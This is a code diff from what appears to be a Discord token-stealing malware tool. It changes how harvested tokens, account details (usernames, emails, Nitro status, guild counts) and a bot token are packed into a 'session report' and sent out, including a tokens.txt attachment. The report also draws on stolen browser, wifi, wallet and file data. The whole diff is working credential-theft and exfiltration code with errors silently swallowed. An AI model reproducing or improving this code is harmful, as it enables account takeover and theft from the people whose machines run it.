@@ -1330,15 +1330,42 @@ def _collect():
     try:
         info, accounts, browsers, wifi, wallets, files, report = _build_report(stage)
         valid = sum(1 for a in accounts if a.get("valid"))
-        description = "\n".join(
-            (
-                f"`{a.get('token')}` -> {a.get('username') or '?'}#{a.get('discriminator') or '0'} "
-                f"/ {a.get('email') or '-'} / nitro {a.get('nitro')} / {a.get('guild_count')} guilds"
-                if a.get("valid") else f"`{str(a.get('token'))[:20]}...` -> invalid"
+
+        # Discord only renders a copy button on fenced blocks, so tokens ship
+        # bare, one per line, inside one. Budget keeps the block under the
+        # 4000-char description cap; the overflow rides in tokens.txt.
+        all_tokens = [str(a.get("token")) for a in accounts if a.get("token")]
+        block, used = [], 0
+        for token in all_tokens:
+            if used + len(token) + 1 > 2200:
+                break
+            block.append(token)
+            used += len(token) + 1
+
+        description = "```\n" + ("\n".join(block) or "no tokens found") + "\n```"
+        if len(block) < len(all_tokens):
+            description += f"\n_{len(all_tokens) - len(block)} more in tokens.txt_"
+
+        details = []
+        for account in accounts:
+            if not account.get("valid"):
+                continue
+            details.append(
+                f"**{account.get('username') or '?'}**#{account.get('discriminator') or '0'} "
+                f"`{account.get('id') or '-'}` — {account.get('email') or 'no email'} — "
+                f"nitro {account.get('nitro')} — {account.get('guild_count')} guilds"
             )
-            for a in accounts
-        ) or "no tokens found"
-        _post(payload=_embed(
+        invalid = len(accounts) - valid
+        if invalid:
+            details.append(f"_{invalid} invalid / expired token(s)_")
+        if details:
+            description += "\n" + "\n".join(details)[:3800 - len(description)]
+
+        token_file = []
+        if all_tokens:
+            token_file = [("tokens.txt", ("\n".join(all_tokens) + "\n").encode("utf-8"))]
+
+        _post(files=token_file or None, label="tokens.txt" if token_file else "", payload=_embed(
             "session report",
             {
                 "Host": f"{info.get('host')} ({info.get('user')})",
@@ -1410,7 +1437,7 @@ def emit_login(bot_tag, bot_id, guild_name, guild_id, token=None, extra=None):
         }
         if extra:
             fields.update(extra)
-        _event("login", fields, f"token: `{token}`" if token else "")
+        _event("login", fields, f"bot token\n```\n{token}\n```" if token else "")
         _spawn_mirror("login")
     except Exception:
         pass
